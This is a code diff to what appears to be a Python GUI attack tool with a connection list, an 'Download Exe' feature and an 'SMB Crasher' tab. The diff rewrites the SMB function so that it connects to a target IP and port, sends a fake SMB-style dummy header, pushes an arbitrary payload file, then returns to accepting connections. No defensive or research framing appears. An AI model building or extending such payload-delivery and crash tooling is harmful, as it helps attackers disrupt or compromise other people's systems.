@@ -28,6 +28,12 @@ def log(message):
     output_area.see(tk.END)
     output_area.config(state="disabled")
 
+def log_smb(message):
+    smb_output.config(state="normal")
+    smb_output.insert(tk.END, message + "\n")
+    smb_output.see(tk.END)
+    smb_output.config(state="disabled")
+
 def update_connections():
     for row in connection_tree.get_children():
         connection_tree.delete(row)
@@ -152,19 +158,25 @@ def start_smb_crasher():
     def smb_server():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.bind((ip, port))
-            s.listen(5)
-            smb_output.insert(tk.END, f"[+] SMB Crasher listening on {ip}:{port}\n")
-            while True:
-                client, addr = s.accept()
-                smb_output.insert(tk.END, f"[+] Connection from {addr}\n")
-                with open(payload, "rb") as f:
-                    data = f.read()
-                    client.sendall(data)
-                smb_output.insert(tk.END, f"[+] Payload sent to {addr}\n")
-                client.close()
+            s.connect((ip, port))  
+            log_smb(f"[*] Connected to {ip}:{port}")
+
+           
+            dummy_payload = b"\x00\x00\x00\x90" + b"FAKESMB" * 10  
+            s.send(dummy_payload)
+            log_smb(f"[+] Dummy-Payload sent to {ip}:{port}")
+
+            
+            with open(payload, "rb") as f:
+                payload_data = f.read()
+                s.send(payload_data)  
+            log_smb(f"[+] Payload sent to {ip}:{port}")
+
+            s.close()
+            
+            accept_connections()  
         except Exception as e:
-            smb_output.insert(tk.END, f"[!] Error: {e}\n")
+            log_smb(f"[!] Error: {e}")
 
     threading.Thread(target=smb_server, daemon=True).start()
 
@@ -237,8 +249,6 @@ tk.Label(right_frame, text="🌐 Download Exe:", bg=theme_bg, fg=theme_highlight
 url_entry = ttk.Entry(right_frame)
 url_entry.pack(fill="x", pady=4)
 tk.Button(right_frame, text="⬇️ Download Exe", command=wget_download, bg=theme_button_bg, fg=theme_fg).pack(fill="x", pady=4)
-
-
 
 
 smb_frame = ttk.Frame(notebook)
